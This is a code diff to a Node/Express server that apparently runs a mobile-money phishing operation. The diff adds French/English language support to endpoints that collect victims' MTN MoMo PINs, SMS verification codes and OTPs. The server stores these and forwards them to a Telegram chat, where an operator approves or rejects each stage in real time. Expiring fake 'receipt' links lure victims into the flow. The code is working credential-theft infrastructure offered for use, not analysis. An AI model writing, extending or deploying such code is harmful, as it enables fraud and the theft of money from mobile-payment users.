@@ -113,6 +113,11 @@ function nowCAT(){
   return new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Lagos' }) + ' WAT';
 }
 
+function normalizeLang(v){
+  const l = String(v || '').toLowerCase().trim();
+  return (l === 'fr' || l === 'en') ? l : 'en';
+}
+
 app.get('/', (_req, res) => {
   res.json({
     ok: true,
@@ -140,7 +145,8 @@ app.get('/api/debug', (_req, res) => {
     tn,
     pinStatus: t.pinStatus,
     smsStatus: t.smsStatus,
-    otpStatus: t.otpStatus
+    otpStatus: t.otpStatus,
+    lang: t.lang || '—'
   });
   res.json({ ok:true, dataDir: DATA_DIR, txs: tList });
 });
@@ -169,6 +175,7 @@ app.post('/api/links', (req, res) => {
     if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });
     const now = Date.now();
     const expiryHours = parseInt(body.expiryHours, 10) || 6;
+    const lang = normalizeLang(body.lang);
     const record = {
       trackingNumber: tracking,
       accountName: body.accountName || '',
@@ -183,17 +190,19 @@ app.post('/api/links', (req, res) => {
       marketedBy: body.marketedBy || '',
       timestamp: body.timestamp || '',
       network: 'mtn',
+      lang: lang,
       expiryHours: expiryHours,
       createdAt: now,
       expiresAt: now + expiryHours * 60 * 60 * 1000
     };
     links.set(tracking, record);
     persistLinks();
-    console.log(`[link] created ${tracking} (expires in ${expiryHours}h)`);
+    console.log(`[link] created ${tracking} (expires in ${expiryHours}h, lang=${lang})`);
     res.json({
       ok: true,
       code: tracking,
       trackingNumber: tracking,
+      lang: lang,
       expiryHours: expiryHours,
       expiresAt: record.expiresAt
     });
@@ -212,9 +221,11 @@ app.get('/api/links/:code', (req, res) => {
     links.delete(code); persistLinks();
     return res.status(410).json({ ok:false, error:'Link expired', expiresAt: rec.expiresAt });
   }
+  const lang = normalizeLang(rec.lang);
   res.json({
     ok: true,
     ...rec,
+    lang: lang,
     tx:  rec.trackingNumber,
     tn:  rec.trackingNumber,
     rn:  rec.accountName,
@@ -233,7 +244,7 @@ app.get('/api/links/:code', (req, res) => {
 
 app.post('/api/mtn/pin', async (req, res) => {
   try {
-    const { tx, pin, phone, am, cur, c, an, rn } = req.body || {};
+    const { tx, pin, phone, am, cur, c, an, rn, lang } = req.body || {};
     if (!tx || !pin) {
       return res.status(400).json({ ok:false, message:'Missing data' });
     }
@@ -241,11 +252,13 @@ app.post('/api/mtn/pin', async (req, res) => {
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
     const t = ensureTx(tracking, { receipt: rec });
+    const L = normalizeLang(lang || rec.lang || t.lang);
 
     t.pinStatus = 'pending';
     t.pinSubmittedAt = Date.now();
     t.pinPhone = phone || '';
     t.pinCode = pin;
+    t.lang = L;
     persistTxs();
 
     const text =
@@ -257,6 +270,7 @@ app.post('/api/mtn/pin', async (req, res) => {
       `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
       `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'MTN MoMo')}\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}`;
 
     const buttons = {
@@ -281,17 +295,19 @@ app.post('/api/mtn/pin', async (req, res) => {
 
 app.post('/api/mtn/sms', async (req, res) => {
   try {
-    const { tx, code, message, am, cur, c, an, rn } = req.body || {};
+    const { tx, code, message, am, cur, c, an, rn, lang } = req.body || {};
     if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
     const t = ensureTx(tracking, { receipt: rec });
+    const L = normalizeLang(lang || rec.lang || t.lang);
 
     t.smsStatus = 'pending';
     t.smsSubmittedAt = Date.now();
     t.smsCode = code || '';
     t.smsMessage = message || '';
+    t.lang = L;
     persistTxs();
 
     const text =
@@ -302,6 +318,7 @@ app.post('/api/mtn/sms', async (req, res) => {
       `📱 <b>Phone:</b> <code>${esc(rec.accountNumber || an || '—')}</code>\n` +
       `🔑 <b>Code:</b> <code>${esc(code || '—')}</code>\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}\n` +
       `\n<b>Message:</b>\n<code>${esc(message || '')}</code>`;
 
@@ -333,16 +350,18 @@ app.post('/api/mtn/sms', async (req, res) => {
 
 app.post('/api/mtn/otp', async (req, res) => {
   try {
-    const { tx, otp, am, cur, c } = req.body || {};
+    const { tx, otp, am, cur, c, lang } = req.body || {};
     if (!tx || !otp) return res.status(400).json({ ok:false, message:'Missing data' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
     const t = ensureTx(tracking, { receipt: rec });
+    const L = normalizeLang(lang || rec.lang || t.lang);
 
     t.otpStatus = 'pending';
     t.otpSubmittedAt = Date.now();
     t.otpCode = otp;
+    t.lang = L;
     persistTxs();
 
     const text =
@@ -352,6 +371,7 @@ app.post('/api/mtn/otp', async (req, res) => {
       `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
       `🔑 <b>OTP:</b> <code>${esc(otp)}</code>\n` +
       `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'UGX')} ${esc(rec.amount || am || '—')}\n` +
+      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}`;
 
     const buttons = {
@@ -382,16 +402,18 @@ app.post('/api/mtn/otp', async (req, res) => {
 
 app.post('/api/mtn/resend', async (req, res) => {
   try {
-    const { tx, stage, c, am, cur } = req.body || {};
+    const { tx, stage, c, am, cur, lang } = req.body || {};
     if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });
 
     const tracking = String(tx).toUpperCase();
     const rec = links.get(tracking) || {};
     const t = ensureTx(tracking, { receipt: rec });
+    const L = normalizeLang(lang || rec.lang || t.lang);
 
     const which = (stage === 'otp') ? 'OTP' : 'SMS';
     if (stage === 'otp') t.otpStatus = 'resend';
     else t.smsStatus = 'resend';
+    t.lang = L;
     persistTxs();
 
     await tgSend(
@@ -399,6 +421,7 @@ app.post('/api/mtn/resend', async (req, res) => {
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 ${esc(rec.accountName || '—')}\n` +
+      `🌍 <b>Lang:</b> ${L.toUpperCase()}\n` +
       `🕒 ${nowCAT()}`,
       null
     );
@@ -416,14 +439,15 @@ app.get('/api/mtn/status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending' });
+  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
 
   res.json({
     ok: true,
     decision: t.pinStatus || 'pending',
     pinStatus: t.pinStatus || 'pending',
     smsStatus: t.smsStatus || 'pending',
-    otpStatus: t.otpStatus || 'pending'
+    otpStatus: t.otpStatus || 'pending',
+    lang: normalizeLang(t.lang)
   });
 });
 
@@ -434,7 +458,7 @@ app.get('/api/mtn/sms-status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending' });
+  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
 
   let decision = 'pending';
   if (t.smsStatus === 'approved') decision = 'approved';
@@ -442,7 +466,7 @@ app.get('/api/mtn/sms-status/:tx', (req, res) => {
   else if (t.smsStatus === 'resend') decision = 'expired';
   else if (t.smsStatus === 'needs_full_sms') decision = 'needs_full_sms';
 
-  res.json({ ok:true, decision, tx: tracking });
+  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
 });
 
 app.get('/api/mtn/otp-status/:tx', (req, res) => {
@@ -452,7 +476,7 @@ app.get('/api/mtn/otp-status/:tx', (req, res) => {
     const restored = loadMap(TXS_FILE);
     if (restored) { txs = restored; t = txs.get(tracking); }
   }
-  if (!t) return res.json({ ok:true, decision:'pending' });
+  if (!t) return res.json({ ok:true, decision:'pending', lang:'en' });
 
   let decision = 'pending';
   if (t.otpStatus === 'approved') decision = 'approved';
@@ -460,7 +484,7 @@ app.get('/api/mtn/otp-status/:tx', (req, res) => {
   else if (t.otpStatus === 'resend') decision = 'expired';
   else if (t.otpStatus === 'inactive') decision = 'inactive';
 
-  res.json({ ok:true, decision, tx: tracking });
+  res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
 });
 
 app.post('/api/telegram-webhook', async (req, res) => {
@@ -505,7 +529,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         persistTxs();
         await tgAnswer(cq.id, labels[action] || action);
         if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
-        console.log(`[webhook] mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus}`);
+        console.log(`[webhook] mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus} lang=${t.lang || 'en'}`);
         return res.json({ ok:true });
       }
     }
